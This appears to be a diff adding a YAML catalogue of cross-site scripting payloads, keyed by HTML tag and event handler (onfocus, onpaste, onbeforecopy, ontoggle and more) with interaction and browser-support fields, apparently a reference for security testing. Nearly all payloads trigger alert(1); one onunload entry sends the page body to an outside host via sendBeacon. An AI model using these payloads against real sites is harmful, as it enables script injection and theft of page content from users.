+    - safari
+  onselectstart:
+    payloads:
+    - <body onselectstart=alert(1)>select some text
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - safari
+  ontouchend:
+    payloads:
+    - '<body ontouchend=alert(1)> '
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  ontouchmove:
+    payloads:
+    - '<body ontouchmove=alert(1)> '
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  ontouchstart:
+    payloads:
+    - '<body ontouchstart=alert(1)> '
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onunhandledrejection:
+    payloads:
+    - <body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+  onunload:
+    payloads:
+    - <body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+  onwheel:
+    payloads:
+    - <body onwheel=alert(1)>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+br:
+  onbeforecopy:
+    payloads:
+    - <br onbeforecopy="alert(1)" contenteditable>test</br>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <br onbeforecut="alert(1)" contenteditable>test</br>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <br id=x tabindex=1 onfocus=alert(1)></br>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <br id=x tabindex=1 onfocusin=alert(1)></br>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <br onpaste="alert(1)" contenteditable>test</br>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+button:
+  onbeforecopy:
+    payloads:
+    - <button onbeforecopy="alert(1)" contenteditable>test</button>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <button onbeforecut="alert(1)" contenteditable>test</button>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <button autofocus onfocus=alert(1)>test</button>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocusin:
+    payloads:
+    - <button autofocus onfocusin=alert(1)>test</button>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpaste:
+    payloads:
+    - <button onpaste="alert(1)" contenteditable>test</button>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+canvas:
+  onbeforecopy:
+    payloads:
+    - <canvas onbeforecopy="alert(1)" contenteditable>test</canvas>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <canvas onbeforecut="alert(1)" contenteditable>test</canvas>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <canvas id=x tabindex=1 onfocus=alert(1)></canvas>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <canvas id=x tabindex=1 onfocusin=alert(1)></canvas>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <canvas onpaste="alert(1)" contenteditable>test</canvas>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+caption:
+  onbeforecopy:
+    payloads:
+    - <caption onbeforecopy="alert(1)" contenteditable>test</caption>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <caption onbeforecut="alert(1)" contenteditable>test</caption>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <caption id=x tabindex=1 onfocus=alert(1)></caption>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <caption id=x tabindex=1 onfocusin=alert(1)></caption>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <caption onpaste="alert(1)" contenteditable>test</caption>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+center:
+  onbeforecopy:
+    payloads:
+    - <center onbeforecopy="alert(1)" contenteditable>test</center>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <center onbeforecut="alert(1)" contenteditable>test</center>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <center id=x tabindex=1 onfocus=alert(1)></center>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <center id=x tabindex=1 onfocusin=alert(1)></center>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <center onpaste="alert(1)" contenteditable>test</center>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+cite:
+  onbeforecopy:
+    payloads:
+    - <cite onbeforecopy="alert(1)" contenteditable>test</cite>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <cite onbeforecut="alert(1)" contenteditable>test</cite>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <cite id=x tabindex=1 onfocus=alert(1)></cite>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <cite id=x tabindex=1 onfocusin=alert(1)></cite>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <cite onpaste="alert(1)" contenteditable>test</cite>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+code:
+  onbeforecopy:
+    payloads:
+    - <code onbeforecopy="alert(1)" contenteditable>test</code>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <code onbeforecut="alert(1)" contenteditable>test</code>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <code id=x tabindex=1 onfocus=alert(1)></code>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <code id=x tabindex=1 onfocusin=alert(1)></code>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <code onpaste="alert(1)" contenteditable>test</code>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+col:
+  onbeforecopy:
+    payloads:
+    - <col onbeforecopy="alert(1)" contenteditable>test</col>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <col onbeforecut="alert(1)" contenteditable>test</col>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <col id=x tabindex=1 onfocus=alert(1)></col>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <col id=x tabindex=1 onfocusin=alert(1)></col>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <col onpaste="alert(1)" contenteditable>test</col>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+colgroup:
+  onbeforecopy:
+    payloads:
+    - <colgroup onbeforecopy="alert(1)" contenteditable>test</colgroup>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <colgroup onbeforecut="alert(1)" contenteditable>test</colgroup>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <colgroup id=x tabindex=1 onfocus=alert(1)></colgroup>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <colgroup id=x tabindex=1 onfocusin=alert(1)></colgroup>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <colgroup onpaste="alert(1)" contenteditable>test</colgroup>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+command:
+  onbeforecopy:
+    payloads:
+    - <command onbeforecopy="alert(1)" contenteditable>test</command>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <command onbeforecut="alert(1)" contenteditable>test</command>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <command id=x tabindex=1 onfocus=alert(1)></command>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <command id=x tabindex=1 onfocusin=alert(1)></command>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <command onpaste="alert(1)" contenteditable>test</command>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+content:
+  onbeforecopy:
+    payloads:
+    - <content onbeforecopy="alert(1)" contenteditable>test</content>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <content onbeforecut="alert(1)" contenteditable>test</content>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <content id=x tabindex=1 onfocus=alert(1)></content>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <content id=x tabindex=1 onfocusin=alert(1)></content>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <content onpaste="alert(1)" contenteditable>test</content>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+custom tags:
+  onfocus:
+    payloads:
+    - <xss id=x tabindex=1 onfocus=alert(1)></xss>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <xss id=x tabindex=1 onfocusin=alert(1)></xss>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+data:
+  onbeforecopy:
+    payloads:
+    - <data onbeforecopy="alert(1)" contenteditable>test</data>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <data onbeforecut="alert(1)" contenteditable>test</data>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <data id=x tabindex=1 onfocus=alert(1)></data>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <data id=x tabindex=1 onfocusin=alert(1)></data>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <data onpaste="alert(1)" contenteditable>test</data>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+datalist:
+  onbeforecopy:
+    payloads:
+    - <datalist onbeforecopy="alert(1)" contenteditable>test</datalist>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <datalist onbeforecut="alert(1)" contenteditable>test</datalist>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <datalist id=x tabindex=1 onfocus=alert(1)></datalist>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <datalist id=x tabindex=1 onfocusin=alert(1)></datalist>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <datalist onpaste="alert(1)" contenteditable>test</datalist>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+dd:
+  onbeforecopy:
+    payloads:
+    - <dd onbeforecopy="alert(1)" contenteditable>test</dd>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <dd onbeforecut="alert(1)" contenteditable>test</dd>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <dd id=x tabindex=1 onfocus=alert(1)></dd>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <dd id=x tabindex=1 onfocusin=alert(1)></dd>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <dd onpaste="alert(1)" contenteditable>test</dd>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+del:
+  onbeforecopy:
+    payloads:
+    - <del onbeforecopy="alert(1)" contenteditable>test</del>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <del onbeforecut="alert(1)" contenteditable>test</del>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <del id=x tabindex=1 onfocus=alert(1)></del>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <del id=x tabindex=1 onfocusin=alert(1)></del>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <del onpaste="alert(1)" contenteditable>test</del>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+details:
+  onbeforecopy:
+    payloads:
+    - <details onbeforecopy="alert(1)" contenteditable>test</details>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <details onbeforecut="alert(1)" contenteditable>test</details>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <details id=x tabindex=1 onfocus=alert(1)></details>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <details id=x tabindex=1 onfocusin=alert(1)></details>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <details onpaste="alert(1)" contenteditable>test</details>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  ontoggle:
+    payloads:
+    - <details ontoggle=alert(1) open>test</details>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+dfn:
+  onbeforecopy:
+    payloads:
+    - <dfn onbeforecopy="alert(1)" contenteditable>test</dfn>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <dfn onbeforecut="alert(1)" contenteditable>test</dfn>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <dfn id=x tabindex=1 onfocus=alert(1)></dfn>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <dfn id=x tabindex=1 onfocusin=alert(1)></dfn>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <dfn onpaste="alert(1)" contenteditable>test</dfn>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+dialog:
+  onbeforecopy:
+    payloads:
+    - <dialog onbeforecopy="alert(1)" contenteditable>test</dialog>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <dialog onbeforecut="alert(1)" contenteditable>test</dialog>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onclose:
+    payloads:
+    - <dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <dialog id=x tabindex=1 onfocus=alert(1)></dialog>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <dialog id=x tabindex=1 onfocusin=alert(1)></dialog>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <dialog onpaste="alert(1)" contenteditable>test</dialog>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+dir:
+  onbeforecopy:
+    payloads:
+    - <dir onbeforecopy="alert(1)" contenteditable>test</dir>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <dir onbeforecut="alert(1)" contenteditable>test</dir>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <dir id=x tabindex=1 onfocus=alert(1)></dir>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <dir id=x tabindex=1 onfocusin=alert(1)></dir>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <dir onpaste="alert(1)" contenteditable>test</dir>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+div:
+  onbeforecopy:
+    payloads:
+    - <div onbeforecopy="alert(1)" contenteditable>test</div>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <div onbeforecut="alert(1)" contenteditable>test</div>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <div id=x tabindex=1 onfocus=alert(1)></div>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <div id=x tabindex=1 onfocusin=alert(1)></div>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <div onpaste="alert(1)" contenteditable>test</div>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+dl:
+  onbeforecopy:
+    payloads:
+    - <dl onbeforecopy="alert(1)" contenteditable>test</dl>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <dl onbeforecut="alert(1)" contenteditable>test</dl>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <dl id=x tabindex=1 onfocus=alert(1)></dl>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <dl id=x tabindex=1 onfocusin=alert(1)></dl>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <dl onpaste="alert(1)" contenteditable>test</dl>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+dt:
+  onbeforecopy:
+    payloads:
+    - <dt onbeforecopy="alert(1)" contenteditable>test</dt>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <dt onbeforecut="alert(1)" contenteditable>test</dt>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <dt id=x tabindex=1 onfocus=alert(1)></dt>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <dt id=x tabindex=1 onfocusin=alert(1)></dt>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <dt onpaste="alert(1)" contenteditable>test</dt>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+element:
+  onbeforecopy:
+    payloads:
+    - <element onbeforecopy="alert(1)" contenteditable>test</element>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <element onbeforecut="alert(1)" contenteditable>test</element>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <element id=x tabindex=1 onfocus=alert(1)></element>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <element id=x tabindex=1 onfocusin=alert(1)></element>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <element onpaste="alert(1)" contenteditable>test</element>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+em:
+  onbeforecopy:
+    payloads:
+    - <em onbeforecopy="alert(1)" contenteditable>test</em>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <em onbeforecut="alert(1)" contenteditable>test</em>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <em id=x tabindex=1 onfocus=alert(1)></em>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <em id=x tabindex=1 onfocusin=alert(1)></em>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <em onpaste="alert(1)" contenteditable>test</em>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+embed:
+  onbeforecopy:
+    payloads:
+    - <embed onbeforecopy="alert(1)" contenteditable>test</embed>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <embed onbeforecut="alert(1)" contenteditable>test</embed>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onerror:
+    payloads:
+    - <embed src=1 onerror=alert(1) type=image/gif>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocus:
+    payloads:
+    - <embed id=x onfocus=alert(1) type=text/html>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <embed id=x onfocusin=alert(1) type=text/html>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onload:
+    payloads:
+    - <embed src=/ onload=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpaste:
+    payloads:
+    - <embed onpaste="alert(1)" contenteditable>test</embed>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+fieldset:
+  onbeforecopy:
+    payloads:
+    - <fieldset onbeforecopy="alert(1)" contenteditable>test</fieldset>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <fieldset onbeforecut="alert(1)" contenteditable>test</fieldset>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <fieldset id=x tabindex=1 onfocus=alert(1)></fieldset>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <fieldset id=x tabindex=1 onfocusin=alert(1)></fieldset>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <fieldset onpaste="alert(1)" contenteditable>test</fieldset>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+figcaption:
+  onbeforecopy:
+    payloads:
+    - <figcaption onbeforecopy="alert(1)" contenteditable>test</figcaption>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <figcaption onbeforecut="alert(1)" contenteditable>test</figcaption>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <figcaption id=x tabindex=1 onfocus=alert(1)></figcaption>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <figcaption id=x tabindex=1 onfocusin=alert(1)></figcaption>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <figcaption onpaste="alert(1)" contenteditable>test</figcaption>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+figure:
+  onbeforecopy:
+    payloads:
+    - <figure onbeforecopy="alert(1)" contenteditable>test</figure>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <figure onbeforecut="alert(1)" contenteditable>test</figure>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <figure id=x tabindex=1 onfocus=alert(1)></figure>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <figure id=x tabindex=1 onfocusin=alert(1)></figure>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <figure onpaste="alert(1)" contenteditable>test</figure>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+font:
+  onbeforecopy:
+    payloads:
+    - <font onbeforecopy="alert(1)" contenteditable>test</font>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <font onbeforecut="alert(1)" contenteditable>test</font>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <font id=x tabindex=1 onfocus=alert(1)></font>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <font id=x tabindex=1 onfocusin=alert(1)></font>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <font onpaste="alert(1)" contenteditable>test</font>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+footer:
+  onbeforecopy:
+    payloads:
+    - <footer onbeforecopy="alert(1)" contenteditable>test</footer>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <footer onbeforecut="alert(1)" contenteditable>test</footer>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <footer id=x tabindex=1 onfocus=alert(1)></footer>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <footer id=x tabindex=1 onfocusin=alert(1)></footer>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <footer onpaste="alert(1)" contenteditable>test</footer>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+form:
+  onbeforecopy:
+    payloads:
+    - <form onbeforecopy="alert(1)" contenteditable>test</form>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <form onbeforecut="alert(1)" contenteditable>test</form>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <form id=x tabindex=1 onfocus=alert(1)></form>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <form id=x tabindex=1 onfocusin=alert(1)></form>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <form onpaste="alert(1)" contenteditable>test</form>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onreset:
+    payloads:
+    - <form onreset=alert(1)><input type=reset>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onsubmit:
+    payloads:
+    - <form onsubmit=alert(1)><input type=submit>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+frame:
+  onbeforecopy:
+    payloads:
+    - <frame onbeforecopy="alert(1)" contenteditable>test</frame>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <frame onbeforecut="alert(1)" contenteditable>test</frame>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <frameset><frame id=x onfocus=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+  onfocusin:
+    payloads:
+    - <frameset><frame id=x onfocusin=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+  onload:
+    payloads:
+    - <frameset><frame onload=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpaste:
+    payloads:
+    - <frame onpaste="alert(1)" contenteditable>test</frame>
+    required: []
